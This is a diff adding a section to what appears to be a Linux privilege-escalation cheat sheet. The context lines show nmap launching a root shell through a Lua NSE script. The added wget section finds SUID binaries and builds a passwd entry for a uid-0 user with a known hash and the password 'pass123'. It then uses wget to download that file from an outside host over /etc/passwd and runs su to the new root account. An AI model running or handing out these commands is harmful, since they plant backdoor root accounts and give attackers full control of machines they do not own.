@@ -61,3 +61,26 @@ $ nmap --script=$TF
 $ echo 'os.execute("/bin/sh")' > /tmp/x.nse
 $ nmap --script /tmp/x.nse
 ```
+
+### wget
+
+```
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/wget
+```
+
+Copy contents of /etc/passwd to your host as passwd.
+
+Add this user with this command:
+
+```
+echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd
+```
+
+**ch:pass123**
+
+```
+$ wget http://192.168.49.60/passwd -O /etc/passwd
+$ su ch
+password:pass123
+```
